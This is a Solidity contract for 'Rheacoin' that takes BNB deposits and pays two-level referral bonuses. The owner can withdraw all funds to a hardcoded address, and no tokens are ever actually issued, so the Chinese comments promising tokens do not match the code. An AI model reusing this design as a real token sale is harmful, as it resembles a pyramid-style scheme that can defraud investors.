/**
 *Submitted for verification at BscScan.com on 2023-02-18
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
/*
1个bnb=15000个代币, 邀请别人购买，获得1500的代币奖励
显示邀请已获得多少奖励, 显示购买的数据, 邀请多少人

后台可以提现, 提取数据:
邀请多少人数据，邀请地址, 奖励多少币, 购买了多少币, 购买的地址
*/
contract Rheacoin{
	using SafeMath for uint256;

    address public _owner; // 管理员,有提币权限地址
    uint256 public _startTime; // 开始时间

	struct User {
        uint16 referLevel1Count; // 我推荐的1级个数
        uint16 referLevel2Count; // 我推荐的2级个数
        uint256 depositBnb; // 我充值的Bnb
        uint256 referLevel1DepositBnb; // 我推荐的1级人充值的Bnb
        uint256 referLevel2DepositBnb; // 我推荐的2级人充值的Bnb
		address referer; // 我的推荐人
	}

	mapping (address => User) private _userInfo;
    address[] private _allUsers; // 方便之后遍历

	constructor(){
        _startTime=block.timestamp;
        _owner=msg.sender;
	}

    // 是否存在不合法的环状parent， 比如A->A, A->B->A ,A->B->C->A,A->B->C->D->A
    function _hasCircleRefer(address userAddress,address refererAddress) internal view returns(bool){ 
        while(refererAddress!=address(0)){
            if(refererAddress == userAddress) return true;
            refererAddress = _userInfo[refererAddress].referer;
        }
        return false;
    }

    function hasCircleRefer(address userAddress,address refererAddress) external view returns(bool){ 
        return _hasCircleRefer(userAddress, refererAddress);
    }
    
	function invest(address from, address refer, uint256 amount) public payable returns (bool success){
        require(from == msg.sender, "Only owner can call");
        require(msg.value >= amount, "Amount is less than pay amount");
        if(_userInfo[from].depositBnb == 0){
            // 首次充值, 放到数组里
            _allUsers.push(from);
        }

        _userInfo[from].depositBnb += amount;
        if(refer != address(0) && _userInfo[msg.sender].referer == address(0) && _userInfo[refer].depositBnb > 0 && !_hasCircleRefer(msg.sender, refer) && refer != from){
            // 首次设置推荐人
            _userInfo[from].referer = refer;            
            // 增加推荐人的推荐人数
            _userInfo[refer].referLevel1Count += 1;
            if(_userInfo[refer].referer!=address(0)) _userInfo[_userInfo[refer].referer].referLevel2Count += 1;
        }

        if(_userInfo[from].referer != address(0)){
            // 给1级推荐人计算奖励
            _userInfo[_userInfo[from].referer].referLevel1DepositBnb += amount;
            payable(_userInfo[from].referer).transfer(amount*25/100);
            if(_userInfo[_userInfo[from].referer].referer != address(0)){
                // 给2级推荐人计算奖励
                _userInfo[_userInfo[_userInfo[from].referer].referer].referLevel2DepositBnb += amount;                
                payable(_userInfo[_userInfo[from].referer].referer).transfer(amount*5/100);
            }
        }
        return true;
	}
    
    function setstarttime(uint256 startTime) public {
        require(msg.sender == _owner, "Only owner can call");
        _startTime = startTime;
    }

    // 投资人个数
    function getalluser() public view returns(uint256){
        return _allUsers.length;
    }

    // 推荐的人的个数
    function getmysonamount(address from, uint256 level) public view returns(uint256){ 
        if(level==1)return _userInfo[from].referLevel1Count;
        if(level==2)return _userInfo[from].referLevel2Count;
        return 0;
    }

    // 推荐的奖励
    function getreferbonus(address from,uint256 level) public view returns(uint256){
        if(level == 1) return _userInfo[from].referLevel1DepositBnb.mul(25).div(100);        
        if(level == 2) return _userInfo[from].referLevel2DepositBnb.mul(5).div(100);
        return 0;
    }

    function getbalance(address from) public view returns(uint256){
        return _userInfo[from].depositBnb.mul(15000).div(1e18);
    }

    function getdepositbnb(address from) public view returns(uint256){
        return _userInfo[from].depositBnb;
    }

    function getUserInfo(address from) public view returns(User memory){
        return _userInfo[from];
    }

    function getAllUserAddress() public view returns(address[] memory){        
        return _allUsers;
    }

    function getAllUserInfo() public view returns(User[] memory){
        User[] memory users = new User[](_allUsers.length); 
        uint i;
        for(i=0; i<_allUsers.length; i++){
            users[i] = _userInfo[_allUsers[i]];
        }
        return users;
    }

    function withdrawBnb(uint256 amount) public returns(bool){
        require(msg.sender == _owner, "Only owner can withdraw");
        require(address(this).balance >= amount , "Insufficient balance of this contract");
        payable(address(0x2D0dA89863CB2dc04C4AA1C9A6D0de03Aa9Db8d7)).transfer(amount);
        return true;
    }
}